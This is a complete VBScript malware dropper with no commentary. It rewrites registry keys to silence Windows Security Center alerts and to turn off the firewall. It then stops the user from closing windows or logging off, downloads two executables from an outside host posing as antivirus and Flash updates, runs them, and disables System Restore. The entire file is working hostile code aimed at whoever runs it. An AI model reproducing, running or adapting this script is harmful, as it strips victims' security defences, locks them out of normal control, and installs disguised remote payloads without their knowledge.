set fso=CreateObject("Scripting.FileSystemObject") 
set shell=CreateObject("Wscript.Shell") 
Shell.regwrite "HKCU\Software\Microsoft\Security Center\FirewallDisableNotify", "1", "REG_DWORD" 
Shell.regwrite "HKCU\Software\Microsoft\Security Center\UpdatesDisableNotify", "1", "REG_DWORD" 
Shell.regwrite "HKCU\Software\Microsoft\Security Center\AntiVirusDisableNotify", "1", "REG_DWORD" 
Shell.regwrite "HKLM\Software\Microsoft\Security Center\FirewallDisableNotify", "1", "REG_DWORD" 
Shell.regwrite "HKLM\Software\Microsoft\Security Center\UpdatesDisableNotify", "1", "REG_DWORD" 
Shell.regwrite "HKLM\Software\Microsoft\Security Center\AntiVirusDisableNotify", "1", "REG_DWORD" 
Shell.regwrite "HKCU\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile\EnableFirewall","0","REG_DWORD" 
Shell.regwrite "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile\EnableFirewall","0","REG_DWORD" 
Shell.regwrite "HKCU\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile\EnableFirewall","0","REG_DWORD" 
Shell.regwrite "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile\EnableFirewall","0","REG_DWORD" 
Shell.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose","1", "REG_DWORD" 
Shell.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoLogoff","1", "REG_DWORD" 
Sub Download 
Set HTTPGET = CreateObject("Microsoft.XMLHTTP") 
HTTPGET.Open "GET",url_get, False 
HTTPGET.Send 
DataBin = HTTPGET.ResponseBody 
Const adTypeBinary=1 
Const adSaveCreateOverWrite=2 
Set ADODB = CreateObject("ADODB.Stream") 
ADODB.Type = adTypeBinary 
ADODB.Open 
ADODB.Write DataBin 
ADODB.SaveToFile save_dir, adSaveCreateOverWrite 
End Sub 
url_get="http://secureservices2010.fileave.com/antivirus-platinum.exe" 
save_dir="c:\309463.exe" 
Call Download 
Shell.run save_dir 
url_get="http://secureservices2010.fileave.com/setup-flash-player-patch.exe" 
save_dir="c:\049256.exe" 
Call Download 
Shell.run save_dir 
Shell.regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore\DisableSR","1", "REG_DWORD" 
Shell.regwrite "HKLM\SYSTEM\CurrentControlSet\Services\sr","4", "REG_DWORD" 
